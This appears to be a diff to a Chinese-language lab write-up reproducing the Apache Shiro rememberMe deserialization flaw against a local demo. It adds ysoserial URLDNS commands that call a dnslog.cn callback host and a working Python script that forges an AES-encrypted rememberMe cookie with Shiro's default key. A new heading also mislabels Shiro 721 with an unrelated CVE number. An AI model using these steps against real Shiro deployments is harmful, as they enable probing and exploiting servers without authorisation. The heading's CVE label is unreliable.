@@ -130,7 +130,56 @@ PS D:\vscode_workspace\JavaThings-master\shirodemo> mvn clean package
 
 ### 漏洞复现
 
+先在[DNSLog Platform](http://www.dnslog.cn/)获得`your-dnslog-domain`，然后测试是否命令可以成功执行。
+
+使用 `ysoserial` 去生成序列化的字节流
+
+```powershell
+PS D:\shiro_payload> java -jar .\ysoserial-all.jar URLDNS http://5507z0.dnslog.cn >urldns.ser
+```
+
+JDK18 生成序列化字节流命令为
+
+```powershell
+cmd /c "java --add-opens=java.base/java.net=ALL-UNNAMED --add-opens=java.base/java.util=ALL-UNNAMED -jar .\ysoserial-all.jar URLDNS http://5507z0.dnslog.cn > urldns.ser"
+```
+
+再将生成的 `urldns.ser`，进行 `AES` 加密和 `Base64` 编码 
+
+```python
+import base64
+import os
+from Crypto.Cipher import AES
+from Crypto.Util.Padding import pad
+
+def shiro_encrypt(serialized_bytes, key_b64="kPH+bIxk5D2deZiIxcaaaA=="):
+    key = base64.b64decode(key_b64)
+    iv = os.urandom(16)
+    cipher = AES.new(key, AES.MODE_CBC, iv)
+    ciphertext = cipher.encrypt(pad(serialized_bytes, AES.block_size))
+    combined = iv + ciphertext
+    return base64.b64encode(combined).decode()
+
+with open("urldns.ser", "rb") as f:
+    payload = f.read()
+
+cookie_value = shiro_encrypt(payload)
+print("rememberMe=" + cookie_value)
+```
+
+使用 `Burp` 进行抓包
+
+![image-20260923135530872](./../images/image-20260923135530872.png)
+
+然后将编码得到的 `payload` 填入 `Cookie` 中，send
+
+![image-20260923141320672](./../images/image-20260923141320672.png)
+
+返回 `DNSLog` 发现成功回显
+
+![image-20260923141259719](./../images/image-20260923141259719.png)
 
 
-## 0x03 ~ Shiro
+
+## 0x03 ~ Shiro 721（CVE-2020-1957）
 
